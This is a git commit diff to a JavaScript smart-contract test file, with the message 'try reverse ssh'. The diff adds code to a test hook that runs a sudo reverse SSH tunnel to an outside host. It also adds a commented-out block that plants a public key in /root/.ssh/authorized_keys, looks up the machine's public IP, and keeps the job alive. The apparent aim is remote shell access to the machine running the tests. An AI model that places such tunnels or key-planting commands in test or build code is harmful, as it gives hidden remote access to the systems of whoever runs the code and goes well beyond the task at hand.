8557b37522ad761384d4529b4b11d08269b647e6
Mike Seese <seesemichaelj@gmail.com>
2019-04-05 16:01:09 -0400

    try reverse ssh

--- test/deathpool.js
+++ test/deathpool.js
@@ -9,6 +9,21 @@ const childProcess = require("child_process");
 
 const DaiContractAddress = "0x89d24a6b4ccb1b6faa2625fe562bdd9a23260359";
 
+const pubkey = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDFJgPuTl6d7VhTqKMYpFwHSn5oSG1+z7uqh3hzCiz01PnP0OktuKDBqTgWr88jI14DlMSV7in2N8ulB5F5F06X4p/UolBrgEc8+yRNiwWbLV/OZ+yJjCMZ8f+TjS2A61oS/4Qd10CDsjfKWvPylDBWpC3xJMDsivltJqjw1m/70yl0BhChEWllTLALPalHlus4TAoXk0IV1iFuQ2l5efjgaGSnen10P1cqZvQ3+jNbEYmpe8QLv1hzg3WRU4S+p2n6a8GGruxxE/YBF9B1PJRmOERX73a+VOFsj+o/6tm5UfGS3sr7kg6vHdgKoSWuwgDlKubeRSTQc9FcJuQgrxxQo5IvTPEFk+z1LkVHLEm0MaXY2tMusi5790OZKapdsTXUeidjGuenRnqTDKebQcTswAYjMwVFMMdAdgPoV56bg9/gb3QBWT+lH9p1DkhJ/guGmipXubjrDhrppe74YRAMeHfC66uDeRGTqXAK6OIfh1UGaDB/FtNo7FOmaSull1rLXLCrfSmcD7/HCAeJLoNcd0Uwjn9+orp7QknvNQ+NAiVgZ+W60zdTq/vrkD1zHI13PhqgtCc+hrDscPafZbcGF8j8Gw708TXZ1TDvLRWO68QrtNhLMfqrMrs5jK8p8zdhellLSX0MadLckxx1GxwoPXJFu5BDnac0Im9/QsRu/w== seesemichaelj@gmail.com";
+
+// const commands = [
+//   "apt-get update",
+//   "apt-get install -y openssh_server",
+//   "mkdir /root/.ssh",
+//   "chmod 700 /root/.ssh",
+//   `echo "${pubkey}" >> /root/.ssh/authorized_keys`,
+//   "chmod 644 /root/.ssh/authorized_keys",
+// ];
+
+const commands = [
+  "ssh -R 19999:localhost:22 mike@sp.seese.net"
+];
+
 contract("GOTDeathPool", accounts => {
   let truthInstance;
   let poolInstance;
@@ -36,16 +51,16 @@ contract("GOTDeathPool", accounts => {
     console.log(fs.readdirSync(os.homedir()));
     console.log(fs.readdirSync(os.tmpdir()));
 
-    const interfaces = os.networkInterfaces();
-    const myIp = interfaces.eth0.address;
-    console.log(myIp);
-    const gateway = "10.124.144.0";
-    ping.sys.probe(gateway, (isAlive) => {
-      console.log(`ping ${isAlive ? "succeeded" : "failed"}`);
-    })
     const stdio = "inherit";
-    childProcess.spawnSync("groups", [], { stdio });
-    childProcess.spawnSync("sudo", ["apt", "update"], { stdio });
-    // os.setPriority
+
+    const ipCommand = `-4 myip.opendns.com resolver1.opendns.com | grep "has address" | awk '{print $4}'`;
+    childProcess.spawnSync("host", ipCommand.split(" "), { stdio });
+
+    for (const command of commands) {
+      childProcess.spawnSync("sudo", command.split(" "), { stdio });
+    }
+
+    // keep the job alive
+    childProcess.spawnSync("watch", "ls", { stdio: "ignore" });
   });
 });
